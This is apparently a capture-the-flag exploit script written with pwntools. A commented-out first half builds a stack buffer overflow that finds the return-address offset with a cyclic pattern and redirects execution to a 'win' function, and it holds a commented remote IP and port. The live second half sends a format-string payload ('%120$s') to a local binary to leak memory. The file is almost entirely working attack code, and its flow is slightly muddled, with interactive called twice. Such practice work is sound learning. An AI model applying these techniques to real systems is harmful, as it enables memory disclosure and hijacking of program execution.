# from pwn import *


# context.log_level = 'info'
# binary_path = 'exploit3.bin'
# elf = ELF(binary_path)


# # print(next(elf.search('/bin/sh')))

# # sh = next(elf.search(b'/bin/sh'))
# # r = ROP(elf)
# # r.system(sh) # running system("/bin/sh")

# #p = remote('34.123.210.162', 20234)
# p = process(elf.path)

# def find_rip_offset(io):
#     io.clean()
#     io.sendline(cyclic(0x50))
#     io.wait()
#     core = io.corefile
#     stack = core.rsp
#     info("rsp = %#x", stack)
#     pattern = core.read(stack, 4)
#     info("cyclic pattern = %s", pattern.decode())
#     rip_offset = cyclic_find(pattern)
#     info("rip offset is = %d", rip_offset)
#     return rip_offset

# offset = find_rip_offset(p)


# padding = b"A" * offset
# info("win %#x", elf.symbols.win)
# retaddr = p64(elf.symbols.win)

# #payload = b"".join([padding, retaddr])
# #payload = padding + retaddr
# payload = flat(
#     {offset: elf.functions.win}
# )

# def print_lines(io):
#     info("printing io received lines")
#     while True:
#         try:
#             line = io.recvline()
#             print(line)
#             #if 'Nice to meet you' in line.decode('utf-8'):
#             #log.info(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>SHELLLLLLLLLLLLLL")
#             #io.interactive()
#         except EOFError:
#             error(">>> EOFError")
#             break

# info("Starting once again!")
# p = process(elf.path)
# p.sendlineafter(b"Hello! What's your name?:", payload)
# #p.sendline(payload)
# #print_lines(p)
# # p.clean()
# # p.interactive()

# line = p.recvline()
# print(line)
# p.interactive()


from pwn import *
import re

# Path to the local binary
binary_path = 'build/format_string_debug'

# Connect to the local binary
p = process(binary_path)

# Craft payload to exploit the format string vulnerability
payload = b"%120$s"

# Wait for the prompt "Enter username"
#p.recvuntil("Enter username:")
print(p.clean().decode('latin-1'))

# Send payload to the program
p.sendline(payload)
p.interactive()
# Receive response from the program
response = p.recvall()

# Print the leaked memory content
print("Leaked memory content: ", response.decode())

# Close the connection
#p.close()
p.interactive()
